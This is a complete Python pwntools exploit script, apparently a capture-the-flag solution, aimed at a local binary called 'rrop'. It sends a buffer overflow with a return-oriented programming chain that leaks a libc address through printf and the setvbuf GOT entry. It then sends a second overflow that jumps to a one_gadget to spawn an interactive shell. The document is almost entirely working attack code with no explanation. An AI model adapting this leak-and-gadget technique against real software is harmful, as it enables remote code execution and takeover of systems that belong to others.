from pwn import *

context.arch = 'amd64'

elf = ELF( './rrop' )
libc = ELF( '/lib/x86_64-linux-gnu/libc.so.6' )

p = elf.process()

p.recvuntil( '@' )
buf_add = int( p.recvuntil( ',' )[:-1], 16 )
p.recvuntil( '\n' )

info( 'buf address: {}'.format( hex( buf_add ) ) )

payload = b'a' * 216
ret_add = 0x0000000000400843
format = 0x400969
pop_rdi = 0x00000000004008b3
pop_rsi_r15 = 0x00000000004008b1
setvbuf_got = elf.got['setvbuf']
printf_plt = elf.plt['printf']
main = elf.symbols['main']

#rop1 = flat( [ pop_rdi, format, pop_rsi_r15, printf_got, 0, printf_plt ] )
rop1 = flat( [ ret_add, pop_rdi, setvbuf_got, printf_plt, ret_add, main ] )
#rop1 = flat( [ ret_add, pop_rdi, buf_add, printf_plt ] )

raw_input()
p.sendline( payload + rop1 )

setvbuf_add = u64( p.recv( 6 ).ljust( 8, b'\x00' ) )
libc.address = setvbuf_add - libc.symbols['setvbuf']

one_gadget = libc.address + 0x4f365

p.recvuntil( 'process.\n' )
p.sendline( payload + p64( one_gadget ) )

p.interactive()
